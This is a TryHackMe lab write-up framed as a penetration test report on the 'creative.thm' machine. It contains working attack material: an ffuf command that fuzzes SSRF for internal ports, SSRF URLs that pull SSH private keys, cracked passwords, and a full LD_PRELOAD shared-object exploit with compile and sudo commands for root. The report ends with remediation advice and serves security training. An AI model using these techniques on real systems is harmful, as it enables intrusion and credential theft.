
### A THM Room 

#### By Sovren 


# Executive Summary 

A penetration test was conducted against the target creative.thm to identify security weaknesses across the web application and underlying system.

The assessment revealed a critical Server-Side Request Forgery (SSRF) vulnerability within a beta feature, which allowed internal service enumeration and access to restricted resources. This flaw enabled the extraction of sensitive files, including user credentials and SSH private keys.

Subsequent exploitation led to unauthorized SSH access as a low-privileged user. Further analysis uncovered insecure credential storage and misconfigured sudo permissions, which ultimately allowed full root privilege escalation via an **LD_PRELOAD** attack.

### Key Findings

- SSRF vulnerability enabling internal network access
- Exposure of sensitive files via internal service (port 1337)
- Weak credential management (plaintext passwords & crackable SSH key)
- Misconfigured sudo permissions allowing privilege escalation

### Impact

An attacker could:
- Access sensitive internal services
- Retrieve user credentials and SSH keys
- Gain persistent system access
- Escalate privileges to **root**, resulting in full system compromise


# Reconnaissance 

Initial reconnaissance involved configuring local name resolution by adding the target domain (`creative.thm`) to the `/etc/hosts` file.

### Technology Stack Identified

Using **Wappalyzer**, the following technologies were observed:

- Web Servers: Apache 2.4.58, Nginx 1.18.0
- JavaScript Library: jQuery 3.4.1
- UI Framework: Bootstrap 4.3.1
- Operating System: Ubuntu
- Embedded Content: YouTube


# Scanning & Enumeration 

### Nmap 

The following open ports were identified:

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1|
|80|HTTP|Nginx 1.18.0 (Ubuntu)|

### Gobuster Results

- `/assets` → Forbidden (301)
#### Virtual Host Discovery

A subdomain was identified:

- `beta.creative.thm` (HTTP 200)

This was added to `/etc/hosts` for resolution.

### Beta Application Analysis & Vulnerability Identification

The beta subdomain hosted a **URL testing feature**, which accepted user-supplied URLs.

Attempts to deploy a web shell failed, but further testing revealed the feature was vulnerable to **Server-Side Request Forgery (SSRF)**.

The URL testing functionality allowed requests to internal resources such as:

http://127.0.0.1

### **Internal Port Discovery via SSRF**

Using fuzzing techniques, internal ports were then enumerated:

```
ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded'
```

#### Findings:

- Port 80 (expected)
- Port 1337 (internal service)

Direct access to port 1337 was not possible externally, but SSRF allowed interaction.


# Exploitation 

### Accessing Internal Service

Using the SSRF vulnerability:

```
http://127.0.0.1:1337
```

The application exposed directory listings, enabling file enumeration.

The command below resulted in obtaining the **user flag**. 
```
http://127.0.0.1:1337/home/saad/user.txt 
```


And the following commands resulted in obtaining RSA keys:
```
http://127.0.0.1:1337/home/saad/.ssh/id_rsa 
http://127.0.0.1:1337/home/saad/.ssh/id_rsa.pub 
```

### **Credential Compromise**

With the RSA keys on the attacking machine, the SSH private key for user `saad` was obtained.

Steps:
1. Converted the private key into a crackable hash
2. Used the password cracking tool John the Ripper

#### Result:

Password: `sweetness`
SSH access obtained.


# Privilege Escalation 

### System Enumeration

- Kernel version: `5.15.0-119-generic`
- No direct `sudo -l` access initially (password required)

### Credential Discovery

Inspection of `.bash_history` revealed:

`MyStrongestPasswordYet$4291`

This password enabled further privilege enumeration.


### Sudo Misconfiguration

Running `sudo -l` revealed:

- Allowed binary: `/usr/bin/ping`
- Environment variable: `LD_PRELOAD` preserved

### Exploiting LD_PRELOAD

From the /tmp directory, a malicious shared object was created:

`nano shell.c` 
```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

Then compiled using:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

And finally executed with:
```
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```


### Root Access Achieved

Successful privilege escalation resulted in Root shell access and the retrieval of:
`/root/root.txt`


## Recommendations

### Critical Fixes

- Disable or properly validate URL inputs to prevent SSRF
- Restrict internal service exposure (e.g., port 1337)
- Implement network segmentation and firewall rules

### Credential Security

- Avoid storing passwords in plaintext or command history
- Enforce strong passphrase policies for SSH keys
- Use key-based authentication without weak passwords

### System Hardening

- Remove `LD_PRELOAD` from sudo environment
- Apply principle of least privilege to sudo permissions
- Disable directory listing on internal services

### Monitoring & Detection

- Implement logging for unusual internal requests
- Monitor for SSRF patterns and anomalies

---

## Conclusion

The system was found to be critically vulnerable, with a full attack chain from external access to root compromise. The combination of SSRF, weak credential handling, and sudo misconfiguration allowed complete system takeover.

Immediate remediation is strongly recommended to prevent real-world exploitation.
